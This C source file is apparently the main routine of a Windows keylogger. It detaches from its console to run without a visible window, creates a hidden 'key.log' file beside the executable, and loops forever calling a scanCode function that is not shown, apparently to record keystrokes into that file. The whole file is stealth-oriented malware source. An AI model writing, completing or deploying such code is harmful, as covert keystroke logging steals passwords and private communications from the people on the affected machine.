#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <libgen.h>

#include "keyscan.h"

#define LEN_VALUE_NAME 1024
#define KEY_FILE "key.log"

bool hide(const char *path){
    DWORD attr = 0;
    attr = GetFileAttributesA(path);
    if(attr & FILE_ATTRIBUTE_HIDDEN)
        return true;
    attr |= FILE_ATTRIBUTE_HIDDEN;
    return SetFileAttributes(path, attr);
}

int main(int argc, char **argv){
    char cur_path[LEN_VALUE_NAME] = {'\0'};
    FreeConsole();
    GetModuleFileName(NULL, cur_path, sizeof(cur_path));
    sprintf_s(cur_path, LEN_VALUE_NAME, "%s\\%s", dirname(cur_path), KEY_FILE);
    hide(cur_path);
    while(true){
        scanCode(cur_path);
    }
    return 0;
}
